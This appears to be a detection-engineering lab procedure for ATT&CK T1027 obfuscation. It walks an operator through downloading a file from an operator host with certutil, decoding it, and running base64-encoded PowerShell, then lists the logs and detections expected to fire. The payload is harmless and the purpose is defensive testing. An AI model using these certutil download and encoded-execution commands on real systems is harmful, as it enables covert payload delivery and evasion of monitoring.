# SC-09 — Obfuscation (evasion procedure)

**ATT&CK:** T1027 (Obfuscated Files or Information), T1027.013
(Encrypted/Encoded Script)

## Objective

Walk the obfuscation ladder through the framework shell — base64
transfer, encoded execution, encrypted script — and mark exactly where
visibility dies. Playbook: `detections/playbooks/T1027-obfuscation.md`.

## Prerequisites

- Interactive shell; operator host serving a test file (see SC-04's
  `python3 -m http.server` setup).

## Procedure (operator console)

```
interact <session-prefix>
shell
```

In the shell (operator host IP `OP`):

```
certutil -urlcache -f http://OP:8000/sample.txt C:\\labs\sample.txt
certutil -decode C:\\labs\sample.txt C:\\labs\decoded.txt
powershell -c "$c = Get-Content C:\\labs\sample.txt -Raw; $b=[Text.Encoding]::UTF8.GetBytes($c); [Convert]::ToBase64String($b)"
powershell -enc <base64 of: Write-Host encoded-run>
type C:\\labs\decoded.txt
back
```

(Prepare `sample.txt` as base64 of a harmless command like
`Write-Host decoded-run`, so the decode step produces runnable script
and the full encoded chain closes.)

## Expected host artifacts

- EID 1: certutil with `-urlcache`/`-decode`, powershell with a long
  base64 `-enc` blob — the blobs ARE the artifact.
- EID 11: `sample.txt`/`decoded.txt` spool+landing.
- EID 3: certutil's fetch connection.
- Script-block logging (4104): catches the decoded content at run time
  — unless SC-07 blinded that process first, which is precisely the
  T1027×T1562.002 stacking takeaway.

## Expected detections

- `0caa33c9-b9da-43ae-ab46-068318375644` (lolbin-certutil).
- `90120763-6b76-4850-aedf-a6a2d57e7d28` (agent-spawns-shell).
- SIEM `-enc` blob hunting (decode-and-alert on encoded command lines).

## Cleanup

`del C:\\labs\sample.txt C:\\labs\decoded.txt`; stop the operator
HTTP server.

## Coverage-report row

```
SC-09 | obfuscation | T1027,T1027.013 | exercised | detections: <what fired>
```
